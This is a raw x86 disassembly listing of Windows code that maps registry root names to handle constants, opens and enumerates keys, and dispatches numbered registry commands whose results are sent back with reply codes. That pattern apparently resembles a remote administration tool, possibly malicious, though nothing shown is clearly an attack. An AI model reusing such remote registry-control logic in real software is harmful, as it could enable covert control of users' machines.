  406377:	85 c0                	test   %eax,%eax
  406379:	75 44                	jne    0x4063bf
  40637b:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40637e:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  406381:	50                   	push   %eax
  406382:	68 30 d9 40 00       	push   $0x40d930
  406387:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40638d:	50                   	push   %eax
  40638e:	8d 85 34 fb ff ff    	lea    -0x4cc(%ebp),%eax
  406394:	50                   	push   %eax
  406395:	8d 45 c8             	lea    -0x38(%ebp),%eax
  406398:	50                   	push   %eax
  406399:	e8 3e 63 00 00       	call   0x40c6dc
  40639e:	83 c4 0c             	add    $0xc,%esp
  4063a1:	b9 40 1b 41 00       	mov    $0x411b40,%ecx
  4063a6:	50                   	push   %eax
  4063a7:	ff 15 18 d2 40 00    	call   *0x40d218
  4063ad:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  4063b0:	ff 15 9c d2 40 00    	call   *0x40d29c
  4063b6:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  4063b9:	ff 15 9c d2 40 00    	call   *0x40d29c
  4063bf:	47                   	inc    %edi
  4063c0:	3b 7d f8             	cmp    -0x8(%ebp),%edi
  4063c3:	72 8f                	jb     0x406354
  4063c5:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  4063c8:	0f 84 7c 01 00 00    	je     0x40654a
  4063ce:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  4063d1:	0f 86 73 01 00 00    	jbe    0x40654a
  4063d7:	33 c0                	xor    %eax,%eax
  4063d9:	8d 7d cd             	lea    -0x33(%ebp),%edi
  4063dc:	88 5d cc             	mov    %bl,-0x34(%ebp)
  4063df:	c7 45 e8 10 27 00 00 	movl   $0x2710,-0x18(%ebp)
  4063e6:	ab                   	stos   %eax,%es:(%edi)
  4063e7:	ab                   	stos   %eax,%es:(%edi)
  4063e8:	66 ab                	stos   %ax,%es:(%edi)
  4063ea:	aa                   	stos   %al,%es:(%edi)
  4063eb:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4063ee:	c7 45 e4 ff 3f 00 00 	movl   $0x3fff,-0x1c(%ebp)
  4063f5:	50                   	push   %eax
  4063f6:	8d 85 24 d4 ff ff    	lea    -0x2bdc(%ebp),%eax
  4063fc:	50                   	push   %eax
  4063fd:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406400:	50                   	push   %eax
  406401:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  406404:	53                   	push   %ebx
  406405:	50                   	push   %eax
  406406:	8d 85 24 54 ff ff    	lea    -0xabdc(%ebp),%eax
  40640c:	66 89 9d 24 54 ff ff 	mov    %bx,-0xabdc(%ebp)
  406413:	50                   	push   %eax
  406414:	ff 75 f4             	push   -0xc(%ebp)
  406417:	ff 75 08             	push   0x8(%ebp)
  40641a:	ff 15 54 d0 40 00    	call   *0x40d054
  406420:	85 c0                	test   %eax,%eax
  406422:	0f 85 13 01 00 00    	jne    0x40653b
  406428:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40642b:	6a 0a                	push   $0xa
  40642d:	50                   	push   %eax
  40642e:	ff 75 dc             	push   -0x24(%ebp)
  406431:	ff 15 88 d3 40 00    	call   *0x40d388
  406437:	83 c4 0c             	add    $0xc,%esp
  40643a:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40643d:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  406443:	50                   	push   %eax
  406444:	68 30 d9 40 00       	push   $0x40d930
  406449:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  40644f:	50                   	push   %eax
  406450:	8d 85 24 54 ff ff    	lea    -0xabdc(%ebp),%eax
  406456:	50                   	push   %eax
  406457:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40645a:	50                   	push   %eax
  40645b:	e8 7c 62 00 00       	call   0x40c6dc
  406460:	83 c4 0c             	add    $0xc,%esp
  406463:	b9 d8 1a 41 00       	mov    $0x411ad8,%ecx
  406468:	50                   	push   %eax
  406469:	ff 15 18 d2 40 00    	call   *0x40d218
  40646f:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  406472:	ff 15 9c d2 40 00    	call   *0x40d29c
  406478:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40647e:	ff 15 9c d2 40 00    	call   *0x40d29c
  406484:	8d 45 ed             	lea    -0x13(%ebp),%eax
  406487:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  40648d:	50                   	push   %eax
  40648e:	68 c8 d5 40 00       	push   $0x40d5c8
  406493:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  406499:	50                   	push   %eax
  40649a:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40649d:	50                   	push   %eax
  40649e:	8d 45 8c             	lea    -0x74(%ebp),%eax
  4064a1:	50                   	push   %eax
  4064a2:	e8 1d 62 00 00       	call   0x40c6c4
  4064a7:	83 c4 0c             	add    $0xc,%esp
  4064aa:	b9 30 1b 41 00       	mov    $0x411b30,%ecx
  4064af:	50                   	push   %eax
  4064b0:	ff 15 e4 d2 40 00    	call   *0x40d2e4
  4064b6:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  4064b9:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4064bf:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  4064c5:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4064cb:	8d 45 ef             	lea    -0x11(%ebp),%eax
  4064ce:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  4064d4:	50                   	push   %eax
  4064d5:	68 90 dc 40 00       	push   $0x40dc90
  4064da:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  4064e0:	50                   	push   %eax
  4064e1:	8d 45 ee             	lea    -0x12(%ebp),%eax
  4064e4:	50                   	push   %eax
  4064e5:	8d 85 24 d4 ff ff    	lea    -0x2bdc(%ebp),%eax
  4064eb:	ff 75 e8             	push   -0x18(%ebp)
  4064ee:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  4064f4:	50                   	push   %eax
  4064f5:	ff 15 d0 d2 40 00    	call   *0x40d2d0
  4064fb:	50                   	push   %eax
  4064fc:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  406502:	50                   	push   %eax
  406503:	e8 b0 61 00 00       	call   0x40c6b8
  406508:	83 c4 0c             	add    $0xc,%esp
  40650b:	b9 50 1b 41 00       	mov    $0x411b50,%ecx
  406510:	50                   	push   %eax
  406511:	ff 15 e4 d2 40 00    	call   *0x40d2e4
  406517:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  40651d:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  406523:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  406529:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40652f:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  406535:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40653b:	ff 45 f4             	incl   -0xc(%ebp)
  40653e:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406541:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  406544:	0f 82 8d fe ff ff    	jb     0x4063d7
  40654a:	5f                   	pop    %edi
  40654b:	5b                   	pop    %ebx
  40654c:	c9                   	leave
  40654d:	c3                   	ret
  40654e:	55                   	push   %ebp
  40654f:	8b ec                	mov    %esp,%ebp
  406551:	56                   	push   %esi
  406552:	8b 35 74 d2 40 00    	mov    0x40d274,%esi
  406558:	8d 45 08             	lea    0x8(%ebp),%eax
  40655b:	68 b8 dc 40 00       	push   $0x40dcb8
  406560:	50                   	push   %eax
  406561:	ff d6                	call   *%esi
  406563:	59                   	pop    %ecx
  406564:	84 c0                	test   %al,%al
  406566:	59                   	pop    %ecx
  406567:	74 07                	je     0x406570
  406569:	be 02 00 00 80       	mov    $0x80000002,%esi
  40656e:	eb 5e                	jmp    0x4065ce
  406570:	8d 45 08             	lea    0x8(%ebp),%eax
  406573:	68 b0 dc 40 00       	push   $0x40dcb0
  406578:	50                   	push   %eax
  406579:	ff d6                	call   *%esi
  40657b:	59                   	pop    %ecx
  40657c:	84 c0                	test   %al,%al
  40657e:	59                   	pop    %ecx
  40657f:	74 07                	je     0x406588
  406581:	be 01 00 00 80       	mov    $0x80000001,%esi
  406586:	eb 46                	jmp    0x4065ce
  406588:	8d 45 08             	lea    0x8(%ebp),%eax
  40658b:	68 a8 dc 40 00       	push   $0x40dca8
  406590:	50                   	push   %eax
  406591:	ff d6                	call   *%esi
  406593:	59                   	pop    %ecx
  406594:	84 c0                	test   %al,%al
  406596:	59                   	pop    %ecx
  406597:	74 07                	je     0x4065a0
  406599:	be 00 00 00 80       	mov    $0x80000000,%esi
  40659e:	eb 2e                	jmp    0x4065ce
  4065a0:	8d 45 08             	lea    0x8(%ebp),%eax
  4065a3:	68 a4 dc 40 00       	push   $0x40dca4
  4065a8:	50                   	push   %eax
  4065a9:	ff d6                	call   *%esi
  4065ab:	59                   	pop    %ecx
  4065ac:	84 c0                	test   %al,%al
  4065ae:	59                   	pop    %ecx
  4065af:	74 07                	je     0x4065b8
  4065b1:	be 03 00 00 80       	mov    $0x80000003,%esi
  4065b6:	eb 16                	jmp    0x4065ce
  4065b8:	8d 45 08             	lea    0x8(%ebp),%eax
  4065bb:	68 9c dc 40 00       	push   $0x40dc9c
  4065c0:	50                   	push   %eax
  4065c1:	ff d6                	call   *%esi
  4065c3:	59                   	pop    %ecx
  4065c4:	84 c0                	test   %al,%al
  4065c6:	59                   	pop    %ecx
  4065c7:	74 12                	je     0x4065db
  4065c9:	be 05 00 00 80       	mov    $0x80000005,%esi
  4065ce:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4065d1:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4065d7:	8b c6                	mov    %esi,%eax
  4065d9:	eb 09                	jmp    0x4065e4
  4065db:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4065de:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4065e4:	5e                   	pop    %esi
  4065e5:	5d                   	pop    %ebp
  4065e6:	c3                   	ret
  4065e7:	55                   	push   %ebp
  4065e8:	8b ec                	mov    %esp,%ebp
  4065ea:	81 ec 94 00 00 00    	sub    $0x94,%esp
  4065f0:	53                   	push   %ebx
  4065f1:	56                   	push   %esi
  4065f2:	57                   	push   %edi
  4065f3:	8d 45 08             	lea    0x8(%ebp),%eax
  4065f6:	83 ec 10             	sub    $0x10,%esp
  4065f9:	8b cc                	mov    %esp,%ecx
  4065fb:	50                   	push   %eax
  4065fc:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406602:	e8 47 ff ff ff       	call   0x40654e
  406607:	83 c4 10             	add    $0x10,%esp
  40660a:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40660d:	33 db                	xor    %ebx,%ebx
  40660f:	51                   	push   %ecx
  406610:	68 19 00 02 00       	push   $0x20019
  406615:	53                   	push   %ebx
  406616:	ff 75 18             	push   0x18(%ebp)
  406619:	50                   	push   %eax
  40661a:	ff 15 40 d0 40 00    	call   *0x40d040
  406620:	85 c0                	test   %eax,%eax
  406622:	0f 85 67 01 00 00    	jne    0x40678f
  406628:	ff 75 fc             	push   -0x4(%ebp)
  40662b:	e8 a3 fc ff ff       	call   0x4062d3
  406630:	38 5d 1c             	cmp    %bl,0x1c(%ebp)
  406633:	59                   	pop    %ecx
  406634:	bf c4 dc 40 00       	mov    $0x40dcc4,%edi
  406639:	74 05                	je     0x406640
  40663b:	bf 20 d6 40 00       	mov    $0x40d620,%edi
  406640:	83 ec 10             	sub    $0x10,%esp
  406643:	be 68 11 41 00       	mov    $0x411168,%esi
  406648:	8b dc                	mov    %esp,%ebx
  40664a:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  406650:	68 50 1b 41 00       	push   $0x411b50
  406655:	56                   	push   %esi
  406656:	68 30 1b 41 00       	push   $0x411b30
  40665b:	56                   	push   %esi
  40665c:	68 d8 1a 41 00       	push   $0x411ad8
  406661:	50                   	push   %eax
  406662:	e8 67 4c 00 00       	call   0x40b2ce
  406667:	59                   	pop    %ecx
  406668:	59                   	pop    %ecx
  406669:	50                   	push   %eax
  40666a:	56                   	push   %esi
  40666b:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40666e:	68 40 1b 41 00       	push   $0x411b40
  406673:	50                   	push   %eax
  406674:	e8 55 4c 00 00       	call   0x40b2ce
  406679:	59                   	pop    %ecx
  40667a:	59                   	pop    %ecx
  40667b:	50                   	push   %eax
  40667c:	56                   	push   %esi
  40667d:	8d 45 ac             	lea    -0x54(%ebp),%eax
  406680:	57                   	push   %edi
  406681:	50                   	push   %eax
  406682:	e8 3d 60 00 00       	call   0x40c6c4
  406687:	83 c4 0c             	add    $0xc,%esp
  40668a:	50                   	push   %eax
  40668b:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40668e:	50                   	push   %eax
  40668f:	e8 24 60 00 00       	call   0x40c6b8
  406694:	83 c4 0c             	add    $0xc,%esp
  406697:	50                   	push   %eax
  406698:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40669b:	50                   	push   %eax
  40669c:	e8 17 60 00 00       	call   0x40c6b8
  4066a1:	83 c4 0c             	add    $0xc,%esp
  4066a4:	50                   	push   %eax
  4066a5:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4066a8:	50                   	push   %eax
  4066a9:	e8 0a 60 00 00       	call   0x40c6b8
  4066ae:	83 c4 0c             	add    $0xc,%esp
  4066b1:	50                   	push   %eax
  4066b2:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4066b5:	50                   	push   %eax
  4066b6:	e8 fd 5f 00 00       	call   0x40c6b8
  4066bb:	83 c4 0c             	add    $0xc,%esp
  4066be:	50                   	push   %eax
  4066bf:	8d 45 9c             	lea    -0x64(%ebp),%eax
  4066c2:	50                   	push   %eax
  4066c3:	e8 f0 5f 00 00       	call   0x40c6b8
  4066c8:	83 c4 0c             	add    $0xc,%esp
  4066cb:	50                   	push   %eax
  4066cc:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  4066d2:	50                   	push   %eax
  4066d3:	e8 e0 5f 00 00       	call   0x40c6b8
  4066d8:	83 c4 0c             	add    $0xc,%esp
  4066db:	50                   	push   %eax
  4066dc:	53                   	push   %ebx
  4066dd:	e8 d6 5f 00 00       	call   0x40c6b8
  4066e2:	83 c4 0c             	add    $0xc,%esp
  4066e5:	b9 e8 1a 41 00       	mov    $0x411ae8,%ecx
  4066ea:	6a 71                	push   $0x71
  4066ec:	e8 39 aa ff ff       	call   0x40112a
  4066f1:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  4066f7:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4066fd:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  406700:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  406706:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  406709:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40670f:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406712:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  406718:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40671b:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  406721:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  406724:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40672a:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40672d:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  406733:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  406736:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40673c:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  406742:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  406748:	be b8 d8 40 00       	mov    $0x40d8b8,%esi
  40674d:	b9 d8 1a 41 00       	mov    $0x411ad8,%ecx
  406752:	56                   	push   %esi
  406753:	ff 15 b4 d1 40 00    	call   *0x40d1b4
  406759:	56                   	push   %esi
  40675a:	b9 40 1b 41 00       	mov    $0x411b40,%ecx
  40675f:	ff 15 b4 d1 40 00    	call   *0x40d1b4
  406765:	be a0 d4 40 00       	mov    $0x40d4a0,%esi
  40676a:	b9 30 1b 41 00       	mov    $0x411b30,%ecx
  40676f:	56                   	push   %esi
  406770:	ff 15 78 d2 40 00    	call   *0x40d278
  406776:	56                   	push   %esi
  406777:	b9 50 1b 41 00       	mov    $0x411b50,%ecx
  40677c:	ff 15 78 d2 40 00    	call   *0x40d278
  406782:	ff 75 fc             	push   -0x4(%ebp)
  406785:	ff 15 34 d0 40 00    	call   *0x40d034
  40678b:	b3 01                	mov    $0x1,%bl
  40678d:	eb 20                	jmp    0x4067af
  40678f:	83 ec 10             	sub    $0x10,%esp
  406792:	8d 45 1f             	lea    0x1f(%ebp),%eax
  406795:	8b cc                	mov    %esp,%ecx
  406797:	50                   	push   %eax
  406798:	68 c0 dc 40 00       	push   $0x40dcc0
  40679d:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  4067a3:	6a 72                	push   $0x72
  4067a5:	b9 e8 1a 41 00       	mov    $0x411ae8,%ecx
  4067aa:	e8 7b a9 ff ff       	call   0x40112a
  4067af:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4067b2:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4067b8:	5f                   	pop    %edi
  4067b9:	8a c3                	mov    %bl,%al
  4067bb:	5e                   	pop    %esi
  4067bc:	5b                   	pop    %ebx
  4067bd:	c9                   	leave
  4067be:	c3                   	ret
  4067bf:	55                   	push   %ebp
  4067c0:	8b ec                	mov    %esp,%ebp
  4067c2:	81 ec 14 01 00 00    	sub    $0x114,%esp
  4067c8:	53                   	push   %ebx
  4067c9:	56                   	push   %esi
  4067ca:	57                   	push   %edi
  4067cb:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  4067ce:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4067d4:	8b 38                	mov    (%eax),%edi
  4067d6:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  4067db:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  4067de:	ff 30                	push   (%eax)
  4067e0:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4067e3:	6a 04                	push   $0x4
  4067e5:	5e                   	pop    %esi
  4067e6:	56                   	push   %esi
  4067e7:	50                   	push   %eax
  4067e8:	ff 15 cc d2 40 00    	call   *0x40d2cc
  4067ee:	83 ec 10             	sub    $0x10,%esp
  4067f1:	8b cc                	mov    %esp,%ecx
  4067f3:	68 68 11 41 00       	push   $0x411168
  4067f8:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  4067fe:	83 ec 10             	sub    $0x10,%esp
  406801:	8d 45 bc             	lea    -0x44(%ebp),%eax
  406804:	8b cc                	mov    %esp,%ecx
  406806:	50                   	push   %eax
  406807:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  40680d:	8d 45 ec             	lea    -0x14(%ebp),%eax
  406810:	50                   	push   %eax
  406811:	e8 d7 4b 00 00       	call   0x40b3ed
  406816:	8b c7                	mov    %edi,%eax
  406818:	83 c4 24             	add    $0x24,%esp
  40681b:	83 e8 35             	sub    $0x35,%eax
  40681e:	0f 84 50 06 00 00    	je     0x406e74
  406824:	48                   	dec    %eax
  406825:	0f 84 3f 05 00 00    	je     0x406d6a
  40682b:	48                   	dec    %eax
  40682c:	0f 84 ee 03 00 00    	je     0x406c20
  406832:	48                   	dec    %eax
  406833:	0f 84 52 01 00 00    	je     0x40698b
  406839:	48                   	dec    %eax
  40683a:	0f 85 b0 06 00 00    	jne    0x406ef0
  406840:	6a 01                	push   $0x1
  406842:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406845:	e8 15 b3 ff ff       	call   0x401b5f
  40684a:	50                   	push   %eax
  40684b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40684e:	50                   	push   %eax
  40684f:	e8 a6 4a 00 00       	call   0x40b2fa
  406854:	59                   	pop    %ecx
  406855:	33 db                	xor    %ebx,%ebx
  406857:	59                   	pop    %ecx
  406858:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40685b:	53                   	push   %ebx
  40685c:	50                   	push   %eax
  40685d:	53                   	push   %ebx
  40685e:	68 06 00 02 00       	push   $0x20006
  406863:	53                   	push   %ebx
  406864:	53                   	push   %ebx
  406865:	53                   	push   %ebx
  406866:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406869:	ff 15 98 d2 40 00    	call   *0x40d298
  40686f:	50                   	push   %eax
  406870:	53                   	push   %ebx
  406871:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406874:	e8 e6 b2 ff ff       	call   0x401b5f
  406879:	83 ec 10             	sub    $0x10,%esp
  40687c:	8b cc                	mov    %esp,%ecx
  40687e:	50                   	push   %eax
  40687f:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406885:	e8 c4 fc ff ff       	call   0x40654e
  40688a:	83 c4 10             	add    $0x10,%esp
  40688d:	50                   	push   %eax
  40688e:	ff 15 60 d0 40 00    	call   *0x40d060
  406894:	ff 75 cc             	push   -0x34(%ebp)
  406897:	8b f0                	mov    %eax,%esi
  406899:	ff 15 34 d0 40 00    	call   *0x40d034
  40689f:	3b f3                	cmp    %ebx,%esi
  4068a1:	0f 85 bc 00 00 00    	jne    0x406963
  4068a7:	83 ec 10             	sub    $0x10,%esp
  4068aa:	8d 45 e6             	lea    -0x1a(%ebp),%eax
  4068ad:	8b cc                	mov    %esp,%ecx
  4068af:	50                   	push   %eax
  4068b0:	68 f8 dc 40 00       	push   $0x40dcf8
  4068b5:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  4068bb:	6a 72                	push   $0x72
  4068bd:	b9 e8 1a 41 00       	mov    $0x411ae8,%ecx
  4068c2:	e8 63 a8 ff ff       	call   0x40112a
  4068c7:	a1 40 d2 40 00       	mov    0x40d240,%eax
  4068cc:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4068cf:	ff 30                	push   (%eax)
  4068d1:	6a 5c                	push   $0x5c
  4068d3:	ff 15 cc d1 40 00    	call   *0x40d1cc
  4068d9:	8b f0                	mov    %eax,%esi
  4068db:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  4068e0:	3b 30                	cmp    (%eax),%esi
  4068e2:	75 21                	jne    0x406905
  4068e4:	53                   	push   %ebx
  4068e5:	53                   	push   %ebx
  4068e6:	53                   	push   %ebx
  4068e7:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4068ea:	e8 70 b2 ff ff       	call   0x401b5f
  4068ef:	83 ec 10             	sub    $0x10,%esp
  4068f2:	8b cc                	mov    %esp,%ecx
  4068f4:	50                   	push   %eax
  4068f5:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  4068fb:	e8 e7 fc ff ff       	call   0x4065e7
  406900:	83 c4 18             	add    $0x18,%esp
  406903:	eb 7e                	jmp    0x406983
  406905:	8d 44 36 02          	lea    0x2(%esi,%esi,1),%eax
  406909:	50                   	push   %eax
  40690a:	e8 21 5b 00 00       	call   0x40c430
  40690f:	59                   	pop    %ecx
  406910:	8b f8                	mov    %eax,%edi
  406912:	56                   	push   %esi
  406913:	8d 45 9c             	lea    -0x64(%ebp),%eax
  406916:	53                   	push   %ebx
  406917:	50                   	push   %eax
  406918:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40691b:	ff 15 3c d2 40 00    	call   *0x40d23c
  406921:	8b c8                	mov    %eax,%ecx
  406923:	ff 15 98 d2 40 00    	call   *0x40d298
  406929:	50                   	push   %eax
  40692a:	57                   	push   %edi
  40692b:	ff 15 3c d3 40 00    	call   *0x40d33c
  406931:	59                   	pop    %ecx
  406932:	59                   	pop    %ecx
  406933:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  406936:	ff 15 9c d2 40 00    	call   *0x40d29c
  40693c:	53                   	push   %ebx
  40693d:	57                   	push   %edi
  40693e:	53                   	push   %ebx
  40693f:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406942:	e8 18 b2 ff ff       	call   0x401b5f
  406947:	83 ec 10             	sub    $0x10,%esp
  40694a:	8b cc                	mov    %esp,%ecx
  40694c:	50                   	push   %eax
  40694d:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406953:	e8 8f fc ff ff       	call   0x4065e7
  406958:	57                   	push   %edi
  406959:	e8 94 5a 00 00       	call   0x40c3f2
  40695e:	83 c4 1c             	add    $0x1c,%esp
  406961:	eb 20                	jmp    0x406983
  406963:	83 ec 10             	sub    $0x10,%esp
  406966:	8d 45 e3             	lea    -0x1d(%ebp),%eax
  406969:	8b cc                	mov    %esp,%ecx
  40696b:	50                   	push   %eax
  40696c:	68 f4 dc 40 00       	push   $0x40dcf4
  406971:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  406977:	6a 72                	push   $0x72
  406979:	b9 e8 1a 41 00       	mov    $0x411ae8,%ecx
  40697e:	e8 a7 a7 ff ff       	call   0x40112a
  406983:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406986:	e9 5f 05 00 00       	jmp    0x406eea
  40698b:	6a 03                	push   $0x3
  40698d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406990:	e8 ca b1 ff ff       	call   0x401b5f
  406995:	8b c8                	mov    %eax,%ecx
  406997:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40699d:	50                   	push   %eax
  40699e:	ff 15 58 d3 40 00    	call   *0x40d358
  4069a4:	3b c6                	cmp    %esi,%eax
  4069a6:	59                   	pop    %ecx
  4069a7:	0f 84 50 01 00 00    	je     0x406afd
  4069ad:	83 f8 0b             	cmp    $0xb,%eax
  4069b0:	0f 84 ab 00 00 00    	je     0x406a61
  4069b6:	50                   	push   %eax
  4069b7:	56                   	push   %esi
  4069b8:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4069bb:	e8 9f b1 ff ff       	call   0x401b5f
  4069c0:	8b c8                	mov    %eax,%ecx
  4069c2:	ff 15 b8 d2 40 00    	call   *0x40d2b8
  4069c8:	50                   	push   %eax
  4069c9:	56                   	push   %esi
  4069ca:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4069cd:	e8 8d b1 ff ff       	call   0x401b5f
  4069d2:	8b c8                	mov    %eax,%ecx
  4069d4:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  4069da:	50                   	push   %eax
  4069db:	6a 02                	push   $0x2
  4069dd:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4069e0:	e8 7a b1 ff ff       	call   0x401b5f
  4069e5:	50                   	push   %eax
  4069e6:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  4069ec:	50                   	push   %eax
  4069ed:	e8 08 49 00 00       	call   0x40b2fa
  4069f2:	59                   	pop    %ecx
  4069f3:	59                   	pop    %ecx
  4069f4:	8b c8                	mov    %eax,%ecx
  4069f6:	ff 15 98 d2 40 00    	call   *0x40d298
  4069fc:	50                   	push   %eax
  4069fd:	6a 01                	push   $0x1
  4069ff:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406a02:	e8 58 b1 ff ff       	call   0x401b5f
  406a07:	50                   	push   %eax
  406a08:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  406a0e:	50                   	push   %eax
  406a0f:	e8 e6 48 00 00       	call   0x40b2fa
  406a14:	59                   	pop    %ecx
  406a15:	59                   	pop    %ecx
  406a16:	8b c8                	mov    %eax,%ecx
  406a18:	ff 15 98 d2 40 00    	call   *0x40d298
  406a1e:	33 db                	xor    %ebx,%ebx
  406a20:	50                   	push   %eax
  406a21:	53                   	push   %ebx
  406a22:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406a25:	e8 35 b1 ff ff       	call   0x401b5f
  406a2a:	83 ec 10             	sub    $0x10,%esp
  406a2d:	8b cc                	mov    %esp,%ecx
  406a2f:	50                   	push   %eax
  406a30:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  406a36:	e8 13 fb ff ff       	call   0x40654e
  406a3b:	83 c4 10             	add    $0x10,%esp
  406a3e:	50                   	push   %eax
  406a3f:	e8 b5 f5 ff ff       	call   0x405ff9
  406a44:	83 c4 18             	add    $0x18,%esp
  406a47:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  406a4d:	88 45 ff             	mov    %al,-0x1(%ebp)
  406a50:	ff 15 9c d2 40 00    	call   *0x40d29c
  406a56:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  406a5c:	e9 2a 01 00 00       	jmp    0x406b8b
  406a61:	56                   	push   %esi
  406a62:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406a65:	e8 f5 b0 ff ff       	call   0x401b5f
  406a6a:	8b c8                	mov    %eax,%ecx
  406a6c:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  406a72:	ff 70 04             	push   0x4(%eax)
  406a75:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  406a78:	ff 30                	push   (%eax)
  406a7a:	6a 02                	push   $0x2
  406a7c:	e8 de b0 ff ff       	call   0x401b5f
  406a81:	50                   	push   %eax
  406a82:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  406a88:	50                   	push   %eax
  406a89:	e8 6c 48 00 00       	call   0x40b2fa
  406a8e:	59                   	pop    %ecx
  406a8f:	59                   	pop    %ecx
  406a90:	8b c8                	mov    %eax,%ecx
  406a92:	ff 15 98 d2 40 00    	call   *0x40d298
  406a98:	50                   	push   %eax
  406a99:	6a 01                	push   $0x1
  406a9b:	8d 4d ec             	lea    -0x14(%ebp),%ecx
